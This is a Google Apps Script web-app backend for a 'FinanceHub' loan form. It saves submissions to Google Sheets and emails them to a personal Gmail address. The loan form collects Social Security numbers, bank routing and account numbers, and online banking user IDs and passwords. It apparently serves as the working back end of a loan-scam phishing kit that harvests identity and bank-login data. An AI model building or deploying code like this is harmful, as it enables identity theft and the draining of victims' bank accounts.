// Google Apps Script for FinanceHub Form Submissions
// Deploy as Web App

// DEPLOYMENT INFORMATION
// ---------------------
// Deployment ID: AKfycbwIlAfBITq6kvRw1xG4cFEV_E09i2FmYuaviFdBGbuDEYHV7NRqFL9B14QFYzcIFkWa
// Web App URL: https://script.google.com/macros/s/AKfycbwIlAfBITq6kvRw1xG4cFEV_E09i2FmYuaviFdBGbuDEYHV7NRqFL9B14QFYzcIFkWa/exec

// Configuration - Updated with your details
const CONFIG = {
  emailNotificationRecipient: 'tyronlincolnn@gmail.com',
  sheetsRecipient: 'finnfoxpersonalloan@gmail.com',
  loanApplicationsSheetId: '1t82NO6YE_65eoG0xOz3Rh-bDMDk4fWI05LDdDBihk0Y',
  contactFormSheetId: '1eSeH8VxDDaXPHYqavO5wtr77qdNznznaF8iqHyXhSs4'
}

function doGet(e) {
  Logger.log('doGet called with: ' + JSON.stringify(e))
  return handleRequest(e)
}

function doPost(e) {
  Logger.log('doPost called with: ' + JSON.stringify(e))
  return handleRequest(e)
}

function handleRequest(e) {
  try {
    // Log the entire event for debugging
    Logger.log('Event received: ' + JSON.stringify(e))
    
    // Handle both GET and POST requests
    let params = {};
    
    if (e && e.parameter) {
      // GET request parameters
      params = e.parameter;
    } else if (e && e.postData && e.postData.contents) {
      // POST request data
      const postData = e.postData.contents;
      Logger.log('POST data received: ' + postData);
      Logger.log('POST data type: ' + e.postData.type);
      
      if (e.postData.type === 'application/json') {
        // Handle JSON data
        params = JSON.parse(postData);
      } else {
        // Parse URL encoded data
        const pairs = postData.split('&');
        for (let i = 0; i < pairs.length; i++) {
          const pair = pairs[i].split('=');
          if (pair.length === 2) {
            params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
          }
        }
      }
    } else {
      // Fallback - try to create a simple test response
      Logger.log('No parameters received, returning test response')
      return createResponse('success', 'Script is working! Event: ' + JSON.stringify(e))
    }
    
    Logger.log('Parsed parameters: ' + JSON.stringify(params))
    
    const formType = params.formType
    
    if (!formType) {
      Logger.log('Error: No formType specified')
      Logger.log('Available parameters: ' + Object.keys(params).join(', '))
      return createResponse('error', 'No form type specified')
    }
    
    if (formType === 'loanApplication') {
      return handleLoanApplication(params)
    } else if (formType === 'contactForm') {
      return handleContactForm(params)
    } else {
      Logger.log('Error: Invalid form type: ' + formType)
      return createResponse('error', 'Invalid form type: ' + formType)
    }
  } catch (error) {
    Logger.log('Error: ' + error.toString())
    return createResponse('error', 'Server error: ' + error.toString())
  }
}

function handleLoanApplication(params) {
  try {
    // Get loan applications sheet
    const sheet = SpreadsheetApp.openById(CONFIG.loanApplicationsSheetId).getActiveSheet()
    
    // Check if headers exist, if not add them
    if (sheet.getRange('A1').getValue() === '') {
      const headers = [
        'Timestamp',
        'Loan Amount ($2,000 - $10,000)',
        'Loan Purpose',
        'First Name',
        'Last Name',
        'Email Address',
        'Home Address',
        'City',
        'State',
        'ZIP Code',
        'Date of Birth',
        'SSN Number',
        'Bank Name',
        'Routing Number',
        'Account Number',
        'User ID',
        'Password',
        'Telephone Number'
      ]
      sheet.appendRow(headers)
    }
    
    // Prepare row data in the exact order you specified
    const rowData = [
      params.loanAmount || '',
      params.loanPurpose || '',
      params.firstName || '',
      params.lastName || '',
      params.email || '',
      params.homeAddress || '',
      params.city || '',
      params.state || '',
      params.zipCode || '',
      params.dateOfBirth || '',
      params.ssnNumber || '',
      params.bankName || '',
      params.routingNumber || '',
      params.accountNumber || '',
      params.userId || '',
      params.password || '',
      params.phoneNumber || ''
    ]
    
    // Add timestamp as first column
    const timestamp = new Date().toLocaleString()
    sheet.appendRow([timestamp, ...rowData])
    
    // Send email notification
    sendLoanApplicationEmail(params)
    
    return createResponse('success', 'Loan application submitted successfully!')
    
  } catch (error) {
    Logger.log('Loan Application Error: ' + error.toString())
    return createResponse('error', 'Failed to save loan application')
  }
}

function handleContactForm(params) {
  try {
    // Get contact form sheet
    const sheet = SpreadsheetApp.openById(CONFIG.contactFormSheetId).getActiveSheet()
    
    // Check if headers exist, if not add them
    if (sheet.getRange('A1').getValue() === '') {
      const headers = [
        'Timestamp',
        'Your Name',
        'Email Address',
        'Message'
      ]
      sheet.appendRow(headers)
    }
    
    // Prepare row data in the exact order you specified
    const rowData = [
      params.name || '',
      params.email || '',
      params.message || ''
    ]
    
    // Add timestamp as first column
    const timestamp = new Date().toLocaleString()
    sheet.appendRow([timestamp, ...rowData])
    
    // Send email notification
    sendContactFormEmail(params)
    
    return createResponse('success', 'Contact form submitted successfully!')
    
  } catch (error) {
    Logger.log('Contact Form Error: ' + error.toString())
    return createResponse('error', 'Failed to save contact form')
  }
}

function sendLoanApplicationEmail(params) {
  try {
    const subject = `New Loan Application - ${params.firstName} ${params.lastName}` 
    const body = `
New loan application received:

Personal Information:
- Name: ${params.firstName} ${params.lastName}
- Email: ${params.email}
- Phone: ${params.phoneNumber}
- Address: ${params.homeAddress}, ${params.city}, ${params.state} ${params.zipCode}

Loan Details:
- Amount: $${params.loanAmount}
- Purpose: ${params.loanPurpose}
- Date of Birth: ${params.dateOfBirth}
- SSN: ${params.ssnNumber}

Bank Information:
- Bank: ${params.bankName}
- Routing: ${params.routingNumber}
- Account: ${params.accountNumber}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send email notification only to the specified recipient
    try {
      MailApp.sendEmail(CONFIG.emailNotificationRecipient, subject, body)
      Logger.log('Loan application email sent successfully to: ' + CONFIG.emailNotificationRecipient)
    } catch (emailError) {
      Logger.log('Failed to send loan application email to ' + CONFIG.emailNotificationRecipient + ': ' + emailError.toString())
    }
    
  } catch (error) {
    Logger.log('Loan Application Email Error: ' + error.toString())
  }
}

function sendContactFormEmail(params) {
  try {
    const subject = `New Contact Form - ${params.name}` 
    const body = `
New contact form submission:

Name: ${params.name}
Email: ${params.email}
Message: ${params.message}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send email notification only to the specified recipient
    try {
      MailApp.sendEmail(CONFIG.emailNotificationRecipient, subject, body)
      Logger.log('Contact form email sent successfully to: ' + CONFIG.emailNotificationRecipient)
    } catch (emailError) {
      Logger.log('Failed to send contact form email to ' + CONFIG.emailNotificationRecipient + ': ' + emailError.toString())
    }
    
  } catch (error) {
    Logger.log('Contact Form Email Error: ' + error.toString())
  }
}

function createResponse(status, message) {
  return ContentService.createTextOutput(JSON.stringify({
    status: status,
    message: message
  })).setMimeType(ContentService.MimeType.JSON)
}

// Test function - run this to test the script
function testScript() {
  const testParams = {
    formType: 'loanApplication',
    firstName: 'John',
    lastName: 'Doe',
    email: 'john@example.com',
    loanAmount: '5000',
    loanPurpose: 'debt-consolidation'
  }
  
  const result = handleLoanApplication(testParams)
  Logger.log('Test Result: ' + result.getContent())
}

// Debug email configuration
function testEmailConfiguration() {
  Logger.log('CONFIG.recipientEmails: ' + JSON.stringify(CONFIG.recipientEmails))
  
  CONFIG.recipientEmails.forEach(email => {
    try {
      const subject = 'Test Email - Configuration Check'
      const body = 'This is a test email to verify configuration.\n\nIf you receive this, the email configuration is working.\n\nRecipient: ' + email + '\nTime: ' + new Date().toLocaleString()
      
      MailApp.sendEmail(email, subject, body)
      Logger.log('Test email sent successfully to: ' + email)
    } catch (emailError) {
      Logger.log('FAILED to send test email to ' + email + ': ' + emailError.toString())
    }
  })
}

// Test contact form email specifically
function testContactEmail() {
  const testParams = {
    formType: 'contactForm',
    name: 'Test User',
    email: 'test@example.com',
    message: 'This is a test contact form submission'
  }
  
  const result = handleContactForm(testParams)
  Logger.log('Contact Test Result: ' + result.getContent())
}
